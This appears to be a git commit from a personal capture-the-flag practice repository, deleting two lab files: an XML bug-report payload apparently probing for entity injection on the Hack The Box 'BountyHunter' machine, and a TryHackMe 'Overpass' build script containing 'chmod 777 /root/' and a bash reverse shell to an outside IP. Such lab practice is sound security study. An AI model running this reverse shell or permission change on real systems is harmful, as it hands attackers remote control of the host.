318b0bed55e5f7b16dfae6f6beb0d63943014c3a
MythicalMoon <KasparsSB@hotmail.com>
2022-10-17 10:16:15 -0400

    removing low quality filler

--- HTB/machines/completed/BounntyHunter/code.ex
+++
@@ -1,8 +0,0 @@
-<?xml  version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE replace [<!ENTITY example "tushar"> ]>
-                <bugreport>
-                <title>test</title>
-                <cwe>test2</cwe>
-                <cvss>test3</cvss>
-                <reward>&example;</reward>
-                </bugreport>
--- THM/Overpass/downloads/src/buildscript.sh
+++
@@ -1,2 +0,0 @@
-chmod 777 /root/;
-bash -i >& /dev/tcp/10.8.176.35/80 0>&1;
